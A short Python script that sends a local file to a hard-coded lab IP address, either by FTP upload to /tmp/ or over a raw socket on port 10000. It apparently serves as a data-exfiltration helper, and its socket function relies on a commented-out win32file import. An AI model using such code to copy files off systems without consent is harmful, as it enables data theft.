import ftplib
import os
import socket

# For use on Windows platforms
# import win32file

def plain_ftp(docpath, server='192.168.127.132'):
    ftp = ftplib.FTP(server)
    ftp_user = input("Enter the FTP username: ")
    ftp_pass = input("Enter the FTP password: ")
    ftp.login(ftp_user, ftp_pass)
    ftp.cwd('/tmp/')
    ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, 'rb'), 1024)
    ftp.quit()

def transmit(document_path):
    client = socket.socket()
    client.connect(('192.168.127.132', 10000))
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(client, win32file._get_osfhandle(f.fileno()), 0, 0, None, 0, b'', b'')

if __name__ == '__main__':
    plain_ftp('test.txt')
    # transmit('test.txt')